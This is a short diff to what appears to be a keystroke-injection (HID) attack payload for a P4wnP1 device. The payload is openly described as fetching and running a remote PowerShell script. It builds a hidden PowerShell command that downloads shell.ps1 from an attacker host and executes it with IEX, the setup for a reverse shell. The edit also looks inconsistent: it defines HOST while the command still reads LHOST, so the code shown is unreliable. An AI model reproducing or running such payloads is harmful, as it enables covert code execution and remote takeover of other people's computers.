@@ -3,7 +3,10 @@
 ### Description: Autorun payload that pulls and executes a remote PowerShell script
 ### Requirements: HID keyboard, hosted shell.ps1 file
 
-LHOST="10.13.37.1"
+CONFIG="/opt/p4wnp1-o2/config/reverse_shell.conf"
+[ -f "$CONFIG" ] && source "$CONFIG"
+
+HOST="${RS_HOST}"
 SCRIPT="shell.ps1"
 
 CMD="powershell -WindowStyle hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/$SCRIPT')"
